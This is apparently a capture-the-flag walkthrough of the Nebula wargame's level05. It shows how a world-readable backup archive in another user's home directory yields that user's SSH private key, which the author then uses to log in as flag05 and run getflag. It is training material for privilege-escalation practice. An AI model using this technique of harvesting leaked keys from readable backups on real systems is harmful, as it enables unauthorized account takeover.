[Level05] instructs us to "Check the flag05 home directory. You are looking for weak directory permissions"

After navigating over to /home/flag05, we take a look at the permissions.

        level05@nebula:~$ pushd /home/flag05/
        level05@nebula:/home/flag05$ ls -al
        total 5
        drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
        drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
        drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
        -rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
        -rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
        -rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
        drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

That hidden backup directory looks interesting -- it has world-readable and execute permissions set. Let's see what it contains:

          level05@nebula:/home/flag05$ cd .backup/
          level05@nebula:/home/flag05/.backup$ ls -al
          total 2
          drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
          drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
          -rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz

Looks like it's a backup. Let's extract it to the level05 home directory and see its contents:

          level05@nebula:/home/flag05/.backup$ tar -xzvf backup-19072011.tgz -C /home/level05/
          .ssh/
          .ssh/id_rsa.pub
          .ssh/id_rsa
          .ssh/authorized_keys

The output shows a public/private key pair. Let's attempt to log into the box as flag05 using the keys.

          level05@nebula:/home/flag05/.backup$ popd
          level05@nebula:~$ ls .ssh
          authorized_keys  id_rsa  id_rsa.pub
          level05@nebula:~$ ssh flag05@localhost

          flag05@nebula:~$ getflag
          You have successfully executed getflag on a target account

That worked! After logging into the box as flag05, I ran the getflag command to verify completion of level05.
